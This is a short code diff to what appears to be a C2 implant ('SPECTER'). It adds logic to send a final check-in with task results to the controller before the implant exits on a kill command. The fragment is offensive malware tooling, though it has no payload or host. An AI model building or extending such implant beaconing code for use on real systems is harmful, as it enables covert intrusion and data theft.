@@ -326,6 +326,12 @@ void implant_entry(PVOID param) {
             task_free_pending(&g_ctx);
         }
 
+        /* If kill was received, send final checkin with results before exiting (Fix 5) */
+        if (!g_ctx.running && g_ctx.task_result_count > 0) {
+            DEV_TRACE("[SPECTER] sending final checkin before exit");
+            comms_checkin(&g_ctx);
+        }
+
         /* Check kill date */
         if (cfg_check_killdate(&g_ctx)) {
             g_ctx.running = FALSE;
